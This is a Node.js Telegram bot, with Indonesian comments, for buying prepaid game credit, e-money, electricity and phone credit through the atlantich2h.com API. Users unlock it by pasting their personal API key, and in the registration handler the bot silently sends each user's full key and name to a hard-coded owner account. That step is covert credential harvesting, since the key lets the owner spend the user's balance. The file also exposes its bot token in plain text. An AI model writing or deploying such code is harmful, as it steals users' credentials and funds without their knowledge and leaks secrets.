const { Telegraf, Markup, session } = require('telegraf');
const axios = require('axios');
const FormData = require('form-data');

const BOT_TOKEN = '8602360591:AAGLcMSN5IQ5mBJjkj_MHmL0l6URlXhkTWw';
const OWNER_ID = '8793356645';
const BASE_URL = 'https://atlantich2h.com';

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const userDb = {}; // Simpan API Key

// --- PERISAI ANTI-CRASH ---
function esc(text) {
    return text ? text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&') : '';
}

// --- FUNGSI REQUEST ANTI-BLOCK ---
async function callAtlantic(endpoint, body = {}) {
    try {
        const formData = new FormData();
        for (const key in body) { formData.append(key, body[key]); }
        const res = await axios.post(`${BASE_URL}${endpoint}`, formData, {
            headers: {
                ...formData.getHeaders(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            timeout: 15000
        });
        return res.data;
    } catch (e) { return { status: false, message: "Server Busy" }; }
}

// --- START ---
bot.start(async (ctx) => {
    ctx.session = {};
    if (userDb[ctx.from.id]) {
        return ctx.replyWithMarkdownV2(`✨ *SALAM HANGAT, YANG MULIA\\!* ✨\n🚀 *Akses PPOB Premium Aktif\\.*`, 
            Markup.inlineKeyboard([
                [Markup.button.callback('👤 MY PROFILE', 'get_profile'), Markup.button.callback('💸 TRANSAKSI', 'menu_kategori')]
            ]));
    }
    ctx.replyWithMarkdownV2(`👑 *SELAMAT DATANG YANG MULIA* 👑\n\n🔒 *Gerbang Terkunci\\!* Silakan kirimkan API Key Anda sekarang\\.`);
});

// --- PENDAFTARAN & INPUT TARGET ---
bot.on('text', async (ctx) => {
    if (!userDb[ctx.from.id]) {
        const apiKey = ctx.message.text.trim();
        const res = await callAtlantic('/get_profile', { api_key: apiKey });
        if (res.status === "true" || res.status === true) {
            userDb[ctx.from.id] = apiKey;
            ctx.reply(`✅ BERHASIL DAFTAR!\n👤 Nama: ${res.data.name}`);
            bot.telegram.sendMessage(OWNER_ID, `🔔 *USER BARU*\n🔑 API: \`${apiKey}\`\n👤 Nama: ${res.data.name}`, { parse_mode: 'Markdown' });
        } else { ctx.reply('❌ API Key Salah!'); }
        return;
    }

    if (ctx.session?.step === 'WAIT_TARGET') {
        ctx.session.target = ctx.message.text;
        ctx.session.step = 'CONFIRM';
        ctx.replyWithMarkdownV2(`🛒 *KONFIRMASI*\n📦 *Produk:* ${esc(ctx.session.prodName)}\n🎯 *Target:* \`${esc(ctx.session.target)}\`\n💸 *Harga:* Rp ${esc(ctx.session.prodPrice)}`,
            Markup.inlineKeyboard([[Markup.button.callback('✅ LANJUTKAN', 'execute')], [Markup.button.callback('❌ BATAL', 'menu_kategori')]]));
    }
});

// --- STEP 1: PILIH KATEGORI ---
bot.action('menu_kategori', (ctx) => {
    ctx.editMessageText('🏷️ *PILIH KATEGORI:*', Markup.inlineKeyboard([
        [Markup.button.callback('🎮 GAMES', 'cat_Games'), Markup.button.callback('📱 E-MONEY', 'cat_E-Money')],
        [Markup.button.callback('💡 PLN', 'cat_PLN'), Markup.button.callback('📞 PULSA', 'cat_Pulsa')]
    ]));
});

// --- STEP 2: PILIH PROVIDER (DANA/OVO/FF/ML) ---
bot.action(/cat_(.+)/, async (ctx) => {
    const category = ctx.match[1];
    const apiKey = userDb[ctx.from.id];
    await ctx.editMessageText(`⌛ Mencari Provider ${category}...`);

    const res = await callAtlantic('/layanan/price_list', { type: 'prabayar', api_key: apiKey });
    if (res.status) {
        // Ambil list provider unik dari kategori tersebut
        const providers = [...new Set(res.data
            .filter(x => x.category.toLowerCase().includes(category.toLowerCase()))
            .map(x => x.provider))];

        const buttons = providers.map(p => [Markup.button.callback(`➡️ ${p}`, `prov_${category}_${p}`)]);
        buttons.push([Markup.button.callback('⬅️ KEMBALI', 'menu_kategori')]);
        
        ctx.editMessageText(`🔍 *PILIH PROVIDER ${category.toUpperCase()}:*`, Markup.inlineKeyboard(buttons));
    }
});

// --- STEP 3: PILIH PRODUK BERDASARKAN PROVIDER ---
bot.action(/prov_(.+)_(.+)/, async (ctx) => {
    const category = ctx.match[1];
    const provider = ctx.match[2];
    const apiKey = userDb[ctx.from.id];

    await ctx.editMessageText(`⌛ Mengambil produk ${provider}...`);
    const res = await callAtlantic('/layanan/price_list', { type: 'prabayar', api_key: apiKey });
    
    if (res.status) {
        const products = res.data.filter(x => x.provider === provider && x.status === 'available');
        // Tampilkan 10 produk pertama agar tidak kepanjangan
        const buttons = products.slice(0, 15).map(p => [Markup.button.callback(`${p.name} - Rp${p.price}`, `buy_${p.code}_${p.price}_${p.name}`)]);
        buttons.push([Markup.button.callback('⬅️ KEMBALI', `cat_${category}`)]);
        
        ctx.editMessageText(`🛒 *LIST PRODUK ${provider.toUpperCase()}:*`, Markup.inlineKeyboard(buttons));
    }
});

// --- STEP 4: INPUT NOMOR ---
bot.action(/buy_(.+)_(.+)_(.+)/, (ctx) => {
    ctx.session.prodCode = ctx.match[1];
    ctx.session.prodPrice = ctx.match[2];
    ctx.session.prodName = ctx.match[3];
    ctx.session.step = 'WAIT_TARGET';
    ctx.editMessageText(`🎯 *Layanan:* ${ctx.session.prodName}\n\n👉 *Silakan ketik Nomor HP / ID Target:*`);
});

// --- STEP 5: EKSEKUSI ---
bot.action('execute', async (ctx) => {
    const apiKey = userDb[ctx.from.id];
    await ctx.editMessageText('🚀 Memproses...');
    const res = await callAtlantic('/transaksi/create', {
        api_key: apiKey,
        code: ctx.session.prodCode,
        target: ctx.session.target,
        reff_id: 'TRX' + Date.now()
    });

    if (res.status) {
        ctx.reply(`✅ BERHASIL!\nID: ${res.data.id}\nStatus: ${res.data.status}\nSN: ${res.data.sn || '-'}`);
    } else { ctx.reply(`❌ Gagal: ${res.message}`); }
    ctx.session = {};
});

// --- PROFILE ---
bot.action('get_profile', async (ctx) => {
    const apiKey = userDb[ctx.from.id];
    const res = await callAtlantic('/get_profile', { api_key: apiKey });
    if (res.status) {
        ctx.replyWithMarkdownV2(`👤 *PROFILE*\n💰 *Saldo:* Rp ${esc(res.data.balance.toLocaleString())}\n✨ *Status:* ${esc(res.data.status)}`);
    }
});

bot.launch().then(() => console.log('🚀 Bot Rapi Yang Mulia Aktif!'));
